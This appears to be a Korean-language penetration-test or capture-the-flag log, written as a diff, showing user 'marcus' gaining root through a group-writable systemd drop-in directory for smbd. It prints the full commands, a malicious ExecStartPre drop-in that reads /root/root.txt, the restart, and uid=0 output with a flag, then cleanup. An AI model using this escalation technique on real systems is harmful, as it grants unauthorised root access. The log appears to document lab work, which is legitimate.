@@ -1,0 +1,33 @@
+명령(marcus ssh): ls -la /etc/systemd/system/ | grep -i smb; ls -la /etc/systemd/system/smbd.service.d/; namei -l /etc/systemd/system/smbd.service.d
+
+drwxrws---  2 root operators 4096 Jun  4 13:41 smbd.service.d
+lrwxrwxrwx  1 root root        36 Jun  2 15:16 smb.service -> /usr/lib/systemd/system/smbd.service
+total 8
+drwxrws--- 2 root operators 4096 Jun  4 13:41 .
+drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
+
+f: /etc/systemd/system/smbd.service.d
+drwxr-xr-x root root      /
+drwxr-xr-x root root      etc
+drwxr-xr-x root root      systemd
+drwxr-xr-x root root      system
+drwxrws--- root operators smbd.service.d
+
+(operators 그룹에 setgid 쓰기 권한 — marcus가 operators 멤버이므로 이 디렉터리에 파일 생성 가능)
+
+배치한 드롭인 파일: /etc/systemd/system/smbd.service.d/zz-priv.conf (scp로 업로드, scripts/E17_priv_dropin.conf와 동일 내용)
+
+[Service]
+ExecStartPre=/bin/bash -c 'id > /tmp/root_proof.txt; cat /root/root.txt >> /tmp/root_proof.txt 2>&1; chmod 644 /tmp/root_proof.txt'
+
+명령(marcus ssh): systemctl daemon-reload; systemctl restart smbd
+(sudo 없이 marcus 권한으로 실행 — 정상 완료됨, polkit을 통해 operators 그룹에 서비스 관리 권한이 위임된 것으로 판단)
+
+명령(marcus ssh, 재시작 완료 후): cat /tmp/root_proof.txt
+
+uid=0(root) gid=0(root) groups=0(root)
+1454289f6f541d9889946fce9320f0ee
+
+판정: ExecStartPre는 systemd 유닛에 User= 지정이 없으면 기본적으로 root로 실행됨 — 위 uid=0(root) 출력과 root.txt 내용 획득으로 root 권한 코드 실행 및 root flag 확보를 직접 확인함.
+
+정리(사후): /etc/systemd/system/smbd.service.d/zz-priv.conf 삭제 (marcus 권한, rm 성공 — 그룹 쓰기 디렉터리라 소유자 무관하게 삭제 가능했음), daemon-reload 재실행, systemctl is-active smbd => active 로 정상 복구 확인.
